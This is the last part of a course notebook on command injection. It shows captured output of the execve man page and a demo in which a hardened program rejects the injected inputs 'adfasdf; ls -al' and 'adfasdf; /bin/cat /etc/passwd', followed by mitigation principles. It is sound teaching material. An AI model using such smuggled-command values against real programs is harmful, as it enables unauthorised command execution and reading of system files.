      "       Instead,  the \u001b[1mset*uid\u001b[22m() calls now successfully change the real UID, but\n",
      "       the kernel sets an internal flag, named \u001b[1mPF_NPROC_EXCEEDED\u001b[22m, to note that\n",
      "       the \u001b[1mRLIMIT_NPROC \u001b[22mresource limit has been exceeded.  If the \u001b[1mPF_NPROC_EX‐\u001b[0m\n",
      "       \u001b[1mCEEDED \u001b[22mflag is set and the resource limit is still exceeded at the time\n",
      "       of a subsequent \u001b[1mexecve\u001b[22m() call, that call fails with the  error  \u001b[1mEAGAIN\u001b[22m.\n",
      "       This kernel logic ensures that the \u001b[1mRLIMIT_NPROC \u001b[22mresource limit is still\n",
      "       enforced  for  the  common privileged daemon workflow—namely, \u001b[1mfork\u001b[22m(2) +\n",
      "       \u001b[1mset*uid\u001b[22m() + \u001b[1mexecve\u001b[22m().\n",
      "\n",
      "       If the resource limit was not still exceeded at the  time  of  the  \u001b[1mex‐\u001b[0m\n",
      "       \u001b[1mecve\u001b[22m()  call (because other processes belonging to this real UID termi‐\n",
      "       nated between the \u001b[1mset*uid\u001b[22m() call and the \u001b[1mexecve\u001b[22m() call), then  the  \u001b[1mex‐\u001b[0m\n",
      "       \u001b[1mecve\u001b[22m()  call  succeeds  and  the  kernel  clears  the \u001b[1mPF_NPROC_EXCEEDED\u001b[0m\n",
      "       process flag.  The flag is also cleared if a subsequent call to \u001b[1mfork\u001b[22m(2)\n",
      "       by this process succeeds.\n",
      "\n",
      "\u001b[1mEXAMPLES\u001b[0m\n",
      "       The following program is designed to be execed by  the  second  program\n",
      "       below.  It just echoes its command-line arguments, one per line.\n",
      "\n",
      "           /* myecho.c */\n",
      "\n",
      "           #include <stdio.h>\n",
      "           #include <stdlib.h>\n",
      "\n",
      "           int\n",
      "           main(int argc, char *argv[])\n",
      "           {\n",
      "               for (size_t j = 0; j < argc; j++)\n",
      "                   printf(\"argv[%zu]: %s\\n\", j, argv[j]);\n",
      "\n",
      "               exit(EXIT_SUCCESS);\n",
      "           }\n",
      "\n",
      "       This  program can be used to exec the program named in its command-line\n",
      "       argument:\n",
      "\n",
      "           /* execve.c */\n",
      "\n",
      "           #include <stdio.h>\n",
      "           #include <stdlib.h>\n",
      "           #include <unistd.h>\n",
      "\n",
      "           int\n",
      "           main(int argc, char *argv[])\n",
      "           {\n",
      "               static char *newargv[] = { NULL, \"hello\", \"world\", NULL };\n",
      "               static char *newenviron[] = { NULL };\n",
      "\n",
      "               if (argc != 2) {\n",
      "                   fprintf(stderr, \"Usage: %s <file-to-exec>\\n\", argv[0]);\n",
      "                   exit(EXIT_FAILURE);\n",
      "               }\n",
      "\n",
      "               newargv[0] = argv[1];\n",
      "\n",
      "               execve(argv[1], newargv, newenviron);\n",
      "               perror(\"execve\");   /* execve() returns only on error */\n",
      "               exit(EXIT_FAILURE);\n",
      "           }\n",
      "\n",
      "       We can use the second program to exec the first as follows:\n",
      "\n",
      "           $ \u001b[1mcc myecho.c -o myecho\u001b[0m\n",
      "           $ \u001b[1mcc execve.c -o execve\u001b[0m\n",
      "           $ \u001b[1m./execve ./myecho\u001b[0m\n",
      "           argv[0]: ./myecho\n",
      "           argv[1]: hello\n",
      "           argv[2]: world\n",
      "\n",
      "       We can also use these programs to demonstrate the use of a  script  in‐\n",
      "       terpreter.   To  do  this we create a script whose \"interpreter\" is our\n",
      "       \u001b[4mmyecho\u001b[24m program:\n",
      "\n",
      "           $ \u001b[1mcat > script\u001b[0m\n",
      "           \u001b[1m#!./myecho script-arg\u001b[0m\n",
      "           \u001b[1m^D\u001b[0m\n",
      "           $ \u001b[1mchmod +x script\u001b[0m\n",
      "\n",
      "       We can then use our program to exec the script:\n",
      "\n",
      "           $ \u001b[1m./execve ./script\u001b[0m\n",
      "           argv[0]: ./myecho\n",
      "           argv[1]: script-arg\n",
      "           argv[2]: ./script\n",
      "           argv[3]: hello\n",
      "           argv[4]: world\n",
      "\n",
      "\u001b[1mSEE ALSO\u001b[0m\n",
      "       \u001b[1mchmod\u001b[22m(2), \u001b[1mexecveat\u001b[22m(2), \u001b[1mfork\u001b[22m(2), \u001b[1mget_robust_list\u001b[22m(2), \u001b[1mptrace\u001b[22m(2), \u001b[1mexec\u001b[22m(3),\n",
      "       \u001b[1mfexecve\u001b[22m(3), \u001b[1mgetauxval\u001b[22m(3), \u001b[1mgetopt\u001b[22m(3), \u001b[1msystem\u001b[22m(3),  \u001b[1mcapabilities\u001b[22m(7),  \u001b[1mcre‐\u001b[0m\n",
      "       \u001b[1mdentials\u001b[22m(7), \u001b[1menviron\u001b[22m(7), \u001b[1mpath_resolution\u001b[22m(7), \u001b[1mld.so\u001b[22m(8)\n",
      "\n",
      "Linux man-pages 6.05.01           2023-05-03                         \u001b[4mexecve\u001b[24m(2)\n"
     ]
    }
   ],
   "source": [
    "! man execve"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "20772acb-515a-4ae5-8a1e-fe3e9bdce32c",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/injection/secure]\n",
    "└─$ ./secure_catall \"adfasdf; ls -al\"\n",
    "/bin/cat: 'adfasdf; ls -al': No such file or directory\n",
    "  \n",
    "  \n",
    "(base) ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/injection/secure]\n",
    "└─$ ./secure_catall \"adfasdf; /bin/cat /etc/passwd\"\n",
    "/bin/cat: 'adfasdf; /bin/cat /etc/passwd': No such file or directory\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "03c11538-0713-4768-81ac-a1e8a6c8e2fa",
   "metadata": {},
   "source": [
    "## Invoking External Commands in Other Languages\n",
    "\n",
    "- risks of invoking external commands or command injection is not limited to C/C++ programs\n",
    "- goal is to avoid problems similar to those caused by the system() function\n",
    "- many languages allow system API, such as PHP, Perl, Python, etc.\n",
    "\n",
    "## Major Principles for Mitigating Command Injection Attacks\n",
    "\n",
    "### Principle of Isolation\n",
    "    \n",
    "- don't mix code with data\n",
    "- various attacks such as system() code execution, XSS (Cross-site scripting), SQL Injection, Buffer Overflows are consequences of mixing code with data\n",
    "\n",
    "### Principle of Least Privilege\n",
    "\n",
    "- a privileged program should be given the just the right amount of power required to perform its tasks\n",
    "- disable the privileges (temporarily or permenanently) when a privileged program doesn't need those\n",
    "- in Linux, seteuid() and setuid() can be used to downgrade/upgrade privilege when needed\n",
    "    - different OSes may provide different APIs\n",
    "    \n",
    "### Principle of Cleanup After\n",
    "\n",
    "- discard the resources after they're done being used\n",
    "- free/release memory used by dynamic variables created using **new**, **malac**, etc.\n",
    "- close files and resources after their usages\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e8ec089d-6c1a-409b-9026-53d517b02bf6",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
